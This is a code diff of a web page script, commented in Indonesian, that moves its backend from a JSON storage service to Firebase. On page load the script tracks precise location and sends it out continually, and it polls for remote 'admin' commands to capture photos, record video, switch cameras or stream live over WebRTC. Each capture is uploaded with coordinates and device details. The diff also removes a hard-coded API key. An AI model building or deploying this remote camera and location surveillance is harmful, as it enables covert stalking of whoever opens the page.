@@ -33,93 +33,109 @@
 </div>
 
 <script>
-    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
-    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
-
-    const LOOP_MS = 3000;
+    // Ganti dengan URL Firebase Realtime Database milikmu (tanpa slash di akhir)
+    // Contoh: https://nama-project-default-rtdb.asia-southeast1.firebasedatabase.app
+    const FIREBASE_DB_URL = "https://YOUR-PROJECT-default-rtdb.firebaseio.com";
     const RECORD_MS = 3500;
-    const STALE_SESSION_MS = 1000 * 60 * 5; // bersihkan sesi mati > 5 menit
+    const LOCATION_PUSH_MS = 1500;
 
     const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
-    let currentFacing = "user"; // "user" = depan, "environment" = belakang
-    let locationData = null;
-    let cameraStream = null;
-    let watchId = null;
-    let mainTimer = null;
-    let isBusy = false;
-    let isInitializing = false;
-    let lastHandledCommandToken = null;
+    const rtcConfig = {
+        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    };
 
-    const video = document.getElementById('videoPreview');
-    const canvas = document.getElementById('captureCanvas');
-    const ctx = canvas.getContext('2d', { alpha: false });
+    let currentFacing = "user"; // "user" = depan, "environment" = belakang
+    let cameraStream = null;
+    let locationData = null;
+    let watchId = null;
+    let locTimer = null;
+    let cmdPollTimer = null;
+    let lastHandledToken = null;
+    let isInitializing = false;
+
+    // WebRTC peer connections per admin/viewer id: { [viewerId]: RTCPeerConnection }
+    const peers = {};
+    const seenCandidates = new Set();
+
+    const video = document.getElementById("videoPreview");
+    const canvas = document.getElementById("captureCanvas");
+    const ctx = canvas.getContext("2d", { alpha: false });
 
     function getCameraLabel() {
         return currentFacing === "environment" ? "Belakang" : "Depan";
     }
 
-    function makeFrameDataUrl(width, quality) {
-        if (!cameraStream || video.readyState < 2) return null;
-        const vw = video.videoWidth || 640;
-        const vh = video.videoHeight || 480;
-        if (!vw || !vh) return null;
-        const targetH = Math.max(1, Math.round((vh / vw) * width));
-        if (canvas.width !== width || canvas.height !== targetH) {
-            canvas.width = width;
-            canvas.height = targetH;
+    function dbUrl(path) {
+        return `${FIREBASE_DB_URL}/${path}.json`;
+    }
+
+    async function dbGet(path) {
+        const res = await fetch(dbUrl(path));
+        if (!res.ok) throw new Error(`GET ${path} failed: ${res.status}`);
+        return res.json();
+    }
+
+    async function dbPut(path, data) {
+        const res = await fetch(dbUrl(path), {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+        if (!res.ok) throw new Error(`PUT ${path} failed: ${res.status}`);
+        return res.json();
+    }
+
+    async function dbPost(path, data) {
+        const res = await fetch(dbUrl(path), {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+        if (!res.ok) throw new Error(`POST ${path} failed: ${res.status}`);
+        return res.json();
+    }
+
+    async function replaceStreamTrackOnPeers() {
+        if (!cameraStream) return;
+        const newVideoTrack = cameraStream.getVideoTracks()[0];
+        if (!newVideoTrack) return;
+
+        for (const pc of Object.values(peers)) {
+            const sender = pc.getSenders().find(s => s.track && s.track.kind === "video");
+            if (sender) {
+                await sender.replaceTrack(newVideoTrack).catch(() => {});
+            }
         }
-        ctx.drawImage(video, 0, 0, width, targetH);
-        return canvas.toDataURL('image/jpeg', quality);
     }
 
     async function openCameraFacing(facingMode) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            return false;
-        }
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return false;
+
         if (cameraStream) {
             cameraStream.getTracks().forEach(t => t.stop());
             cameraStream = null;
         }
+
         try {
             cameraStream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: { ideal: facingMode },
-                    width: { ideal: 480 },
-                    height: { ideal: 360 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 24, max: 30 }
                 },
                 audio: false
             });
             currentFacing = facingMode;
             video.srcObject = cameraStream;
             await video.play().catch(() => {});
+            await replaceStreamTrackOnPeers();
+            await pushPresence();
             return true;
         } catch (err) {
             console.error("Camera error:", err);
             return false;
         }
-    }
-
-    async function fetchStorage() {
-        const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
-        if (!res.ok) throw new Error(`Fetch failed: ${res.status}`);
-        const data = await res.json();
-        return {
-            logs: Array.isArray(data?.logs) ? data.logs : [],
-            liveSessions: data?.liveSessions && typeof data.liveSessions === "object" ? data.liveSessions : {},
-            command: data?.command && typeof data.command === "object"
-                ? data.command
-                : { action: "NONE", targetSessionId: null, facing: null, token: null }
-        };
-    }
-
-    async function saveStorage(payload) {
-        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
-        const res = await fetch(putUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        if (!res.ok) throw new Error(`Save failed: ${res.status}`);
     }
 
     function startLocationWatcher() {
@@ -137,10 +153,10 @@
                         lat: Number(pos.coords.latitude.toFixed(6)),
                         lng: Number(pos.coords.longitude.toFixed(6)),
                         akurasi: Math.round(pos.coords.accuracy) + " meter",
-                        speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
+                        kecepatan: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                             ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
                             : "-",
-                        heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
+                        arah: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
                             ? Math.round(pos.coords.heading) + "°"
                             : "-"
                     };
@@ -155,17 +171,28 @@
                         reject(err);
                     }
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 2000 }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
             );
         });
     }
 
+    function capturePhotoDataUrl(width = 640, quality = 0.7) {
+        if (!cameraStream || video.readyState < 2) return null;
+        const vw = video.videoWidth || 640;
+        const vh = video.videoHeight || 480;
+        const targetH = Math.max(1, Math.round((vh / vw) * width));
+        canvas.width = width;
+        canvas.height = targetH;
+        ctx.drawImage(video, 0, 0, width, targetH);
+        return canvas.toDataURL("image/jpeg", quality);
+    }
+
     function pickMimeType() {
-        const candidates = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+        const candidates = ["video/webm;codecs=vp8", "video/webm", "video/mp4"];
         for (const m of candidates) {
             if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
         }
-        return '';
+        return "";
     }
 
     function recordClipBase64() {
@@ -175,7 +202,7 @@
                 return;
             }
             const mime = pickMimeType();
-            const opts = { videoBitsPerSecond: 140000 };
+            const opts = { videoBitsPerSecond: 300000 };
             if (mime) opts.mimeType = mime;
 
             let rec;
@@ -186,7 +213,7 @@
             rec.ondataavailable = (ev) => { if (ev.data && ev.data.size > 0) chunks.push(ev.data); };
             rec.onerror = () => reject(new Error("Record error"));
             rec.onstop = () => {
-                const blob = new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' });
+                const blob = new Blob(chunks, { type: rec.mimeType || mime || "video/webm" });
                 const reader = new FileReader();
                 reader.onloadend = () => resolve(reader.result);
                 reader.onerror = () => reject(new Error("Read error"));
@@ -200,106 +227,156 @@
         });
     }
 
-    function pruneStaleSessions(sessions) {
-        const now = Date.now();
-        const cleaned = {};
-        for (const [key, val] of Object.entries(sessions || {})) {
-            if (key === sessionId) {
-                cleaned[key] = val;
-                continue;
-            }
-            if (val && typeof val.updatedAt === "number" && (now - val.updatedAt) <= STALE_SESSION_MS) {
-                cleaned[key] = val;
-            }
-        }
-        return cleaned;
+    async function pushPresence() {
+        if (!locationData) return;
+        const nowStr = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) + " WIB";
+        await dbPut(`liveSessions/${sessionId}`, {
+            sessionId,
+            nama: "HP Saya",
+            kameraAktif: Boolean(cameraStream),
+            kameraPosisi: getCameraLabel(),
+            lat: locationData.lat,
+            lng: locationData.lng,
+            akurasi: locationData.akurasi,
+            kecepatan: locationData.kecepatan,
+            arah: locationData.arah,
+            waktu: nowStr,
+            updatedAt: Date.now(),
+            perangkat: navigator.userAgent
+        }).catch(() => {});
     }
 
-    async function syncTick() {
-        if (isBusy || !locationData) return;
-        isBusy = true;
+    async function ensurePeerForViewer(viewerId) {
+        if (peers[viewerId]) return peers[viewerId];
+        if (!cameraStream) return null;
 
+        const pc = new RTCPeerConnection(rtcConfig);
+        peers[viewerId] = pc;
+
+        cameraStream.getTracks().forEach(track => {
+            pc.addTrack(track, cameraStream);
+        });
+
+        pc.onicecandidate = async (event) => {
+            if (event.candidate) {
+                await dbPost(`calls/${sessionId}/memberCandidates`, {
+                    viewerId,
+                    candidate: event.candidate.toJSON(),
+                    ts: Date.now()
+                }).catch(() => {});
+            }
+        };
+
+        pc.onconnectionstatechange = () => {
+            if (["disconnected", "failed", "closed"].includes(pc.connectionState)) {
+                pc.close();
+                delete peers[viewerId];
+            }
+        };
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+
+        await dbPut(`calls/${sessionId}/offers/${viewerId}`, {
+            sdp: offer.sdp,
+            type: offer.type,
+            updatedAt: Date.now()
+        });
+
+        return pc;
+    }
+
+    async function syncSignalingAndCommands() {
         try {
-            const state = await fetchStorage();
-            const nowStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";
-
-            const cmd = state.command || {};
-            const isForMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
-            const validActions = ["PHOTO", "RECORD", "SWITCH_CAM"];
-            const hasNewAction = validActions.includes(cmd.action) && cmd.token && cmd.token !== lastHandledCommandToken;
-
-            if (isForMe && hasNewAction) {
-                lastHandledCommandToken = cmd.token;
-
-                if (cmd.action === "SWITCH_CAM") {
-                    const targetFacing = cmd.facing === "environment" || cmd.facing === "user"
-                        ? cmd.facing
-                        : (currentFacing === "user" ? "environment" : "user");
-                    await openCameraFacing(targetFacing);
-                } else if (cmd.action === "PHOTO" && cameraStream) {
-                    const foto = makeFrameDataUrl(480, 0.58);
-                    if (foto) {
-                        state.logs.unshift({
-                            id: Date.now(),
-                            sessionId: sessionId,
-                            tipe: "foto",
-                            kameraPosisi: getCameraLabel(),
-                            nama: "HP Saya",
-                            foto: foto,
-                            video: null,
-                            lat: locationData.lat,
-                            lng: locationData.lng,
-                            akurasi: locationData.akurasi,
-                            waktu: nowStr,
-                            perangkat: navigator.userAgent
-                        });
+            // 1. Cek permintaan live call / answer / ICE candidate dari admin
+            const callData = await dbGet(`calls/${sessionId}`);
+            if (callData) {
+                const callRequests = callData.requests || {};
+                for (const [viewerId, req] of Object.entries(callRequests)) {
+                    if (req && req.active) {
+                        await ensurePeerForViewer(viewerId);
                     }
-                } else if (cmd.action === "RECORD" && cameraStream) {
-                    const videoClip = await recordClipBase64();
-                    state.logs.unshift({
-                        id: Date.now(),
-                        sessionId: sessionId,
-                        tipe: "rekaman",
-                        kameraPosisi: getCameraLabel(),
-                        nama: "HP Saya",
-                        foto: null,
-                        video: videoClip,
-                        lat: locationData.lat,
-                        lng: locationData.lng,
-                        akurasi: locationData.akurasi,
-                        waktu: nowStr,
-                        perangkat: navigator.userAgent
-                    });
                 }
 
-                state.command = { action: "NONE", targetSessionId: null, facing: null, token: null };
+                const answers = callData.answers || {};
+                for (const [viewerId, ans] of Object.entries(answers)) {
+                    const pc = peers[viewerId];
+                    if (pc && ans && ans.sdp && !pc.currentRemoteDescription) {
+                        await pc.setRemoteDescription(new RTCSessionDescription(ans)).catch(() => {});
+                    }
+                }
+
+                const adminCandidates = callData.adminCandidates || {};
+                for (const [candId, item] of Object.entries(adminCandidates)) {
+                    const key = `admin_${candId}`;
+                    if (!seenCandidates.has(key) && item && item.candidate && peers[item.viewerId]) {
+                        seenCandidates.add(key);
+                        await peers[item.viewerId].addIceCandidate(new RTCIceCandidate(item.candidate)).catch(() => {});
+                    }
+                }
             }
 
-            const liveFrame = makeFrameDataUrl(200, 0.32);
-            const nextSessions = pruneStaleSessions(state.liveSessions);
+            // 2. Cek perintah (SWITCH_CAM, PHOTO, RECORD)
+            const cmd = await dbGet("command");
+            if (cmd && cmd.token && cmd.token !== lastHandledToken) {
+                const forMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
+                if (forMe && ["SWITCH_CAM", "PHOTO", "RECORD"].includes(cmd.action)) {
+                    lastHandledToken = cmd.token;
+                    const nowStr = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) + " WIB";
 
-            nextSessions[sessionId] = {
-                sessionId: sessionId,
-                nama: "HP Saya",
-                kameraAktif: Boolean(cameraStream),
-                kameraPosisi: getCameraLabel(),
-                frame: liveFrame,
-                lat: locationData.lat,
-                lng: locationData.lng,
-                akurasi: locationData.akurasi,
-                kecepatan: locationData.speed,
-                arah: locationData.heading,
-                waktu: nowStr,
-                updatedAt: Date.now(),
-                perangkat: navigator.userAgent
-            };
+                    if (cmd.action === "SWITCH_CAM") {
+                        const targetFacing = (cmd.facing === "environment" || cmd.facing === "user")
+                            ? cmd.facing
+                            : (currentFacing === "user" ? "environment" : "user");
+                        await openCameraFacing(targetFacing);
+                    } else if (cmd.action === "PHOTO" && cameraStream) {
+                        const foto = capturePhotoDataUrl(640, 0.68);
+                        if (foto && locationData) {
+                            await dbPost("logs", {
+                                id: Date.now(),
+                                sessionId,
+                                tipe: "foto",
+                                kameraPosisi: getCameraLabel(),
+                                nama: "HP Saya",
+                                foto,
+                                video: null,
+                                lat: locationData.lat,
+                                lng: locationData.lng,
+                                akurasi: locationData.akurasi,
+                                waktu: nowStr,
+                                perangkat: navigator.userAgent
+                            });
+                        }
+                    } else if (cmd.action === "RECORD" && cameraStream) {
+                        const clip = await recordClipBase64();
+                        if (clip && locationData) {
+                            await dbPost("logs", {
+                                id: Date.now(),
+                                sessionId,
+                                tipe: "rekaman",
+                                kameraPosisi: getCameraLabel(),
+                                nama: "HP Saya",
+                                foto: null,
+                                video: clip,
+                                lat: locationData.lat,
+                                lng: locationData.lng,
+                                akurasi: locationData.akurasi,
+                                waktu: nowStr,
+                                perangkat: navigator.userAgent
+                            });
+                        }
+                    }
 
-            state.liveSessions = nextSessions;
-            await saveStorage(state);
+                    await dbPut("command", {
+                        action: "NONE",
+                        targetSessionId: null,
+                        facing: null,
+                        token: null
+                    }).catch(() => {});
+                }
+            }
         } catch (err) {
-            console.error(err);
-        } finally {
-            isBusy = false;
+            console.error("Sync error:", err);
         }
     }
 
@@ -311,16 +388,20 @@
             if (!locationData) {
                 await startLocationWatcher();
             }
-            if (locationData && !cameraStream) {
+            if (!cameraStream) {
                 await openCameraFacing(currentFacing);
             }
-            if (locationData) {
-                if (mainTimer) clearInterval(mainTimer);
-                await syncTick();
-                mainTimer = setInterval(syncTick, LOOP_MS);
-            }
+
+            await pushPresence();
+            await syncSignalingAndCommands();
+
+            if (locTimer) clearInterval(locTimer);
+            if (cmdPollTimer) clearInterval(cmdPollTimer);
+
+            locTimer = setInterval(pushPresence, LOCATION_PUSH_MS);
+            cmdPollTimer = setInterval(syncSignalingAndCommands, 800);
         } catch (err) {
-            console.error(err);
+            console.error("Init failed:", err);
         } finally {
             isInitializing = false;
         }
@@ -333,9 +414,13 @@
     }
 
     function cleanupSession() {
-        if (mainTimer) clearInterval(mainTimer);
+        if (locTimer) clearInterval(locTimer);
+        if (cmdPollTimer) clearInterval(cmdPollTimer);
         if (watchId !== null) navigator.geolocation.clearWatch(watchId);
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+        for (const pc of Object.values(peers)) {
+            pc.close();
+        }
     }
 
     window.addEventListener("DOMContentLoaded", initSession);
